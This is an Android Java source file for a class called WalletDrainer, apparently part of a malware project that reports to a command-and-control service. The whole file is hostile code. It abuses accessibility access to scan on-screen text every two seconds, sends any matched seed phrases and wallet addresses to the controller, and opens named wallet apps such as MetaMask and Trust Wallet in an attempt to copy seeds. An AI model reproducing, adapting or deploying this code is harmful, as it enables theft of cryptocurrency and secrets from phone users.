package com.wuzenx.engine;

import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityNodeInfo;
import com.wuzenx.C2Service;
import com.wuzenx.services.WuzenAccessibilityService;
import java.util.regex.Pattern;
import java.util.regex.Matcher;

public class WalletDrainer {
    private C2Service c2;
    private boolean active = false;
    private Handler handler = new Handler(Looper.getMainLooper());
    
    private Pattern seedPattern = Pattern.compile("\\b([a-z]+\\s+){11,23}[a-z]+\\b", Pattern.CASE_INSENSITIVE);
    private Pattern addrPattern = Pattern.compile("(0x[a-fA-F0-9]{40})|([13][a-km-zA-HJ-NP-Z1-9]{25,34})|(bc1[a-zA-HJ-NP-Z0-9]{39,59})|(T[a-zA-HJ-NP-Z0-9]{33})");

    public WalletDrainer(C2Service c2) { this.c2 = c2; }

    public void start() { active = true; c2.sendMessage("log", "Wallet scanner started"); scan(); }
    public void stop() { active = false; handler.removeCallbacksAndMessages(null); }

    private void scan() {
        if (!active) return;
        try {
            AccessibilityNodeInfo root = WuzenAccessibilityService.instance != null ?
                WuzenAccessibilityService.instance.getRootInActiveWindow() : null;
            if (root != null) {
                scanNode(root, 0);
                root.recycle();
            }
        } catch (Exception ignored) {}
        handler.postDelayed(() -> scan(), 2000);
    }

    private void scanNode(AccessibilityNodeInfo node, int depth) {
        if (depth > 15 || !active) return;
        String t = node.getText() != null ? node.getText().toString() : "";
        String d = node.getContentDescription() != null ? node.getContentDescription().toString() : "";
        String text = t + " " + d;
        
        Matcher seedMatcher = seedPattern.matcher(text);
        while (seedMatcher.find()) c2.sendMessage("seedphrase", seedMatcher.group().trim());
        
        Matcher addrMatcher = addrPattern.matcher(text);
        while (addrMatcher.find()) c2.sendMessage("crypto_wallet", addrMatcher.group().trim());
        
        for (int i = 0; i < node.getChildCount(); i++) {
            try {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) { scanNode(child, depth + 1); child.recycle(); }
            } catch (Exception ignored) {}
        }
    }

    public void drainWallet(String targetAddress) {
        c2.sendMessage("log", "Drain initiated to: " + targetAddress);
        // Attempt to auto-navigate wallet settings and copy seed
        try {
            String[] walletPackages = {"com.trustwallet.app", "io.metamask", "com.binance.dev",
                "com.coinbase.android", "com.mycelium.wallet", "com.bitcoin.wallet.btc"};
            for (String pkg : walletPackages) {
                try {
                    Intent intent = c2.getPackageManager().getLaunchIntentForPackage(pkg);
                    if (intent != null) {
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        c2.startActivity(intent);
                        c2.sendMessage("log", "Opening wallet: " + pkg);
                        break;
                    }
                } catch (Exception ignored) {}
            }
        } catch (Exception ignored) {}
    }
}
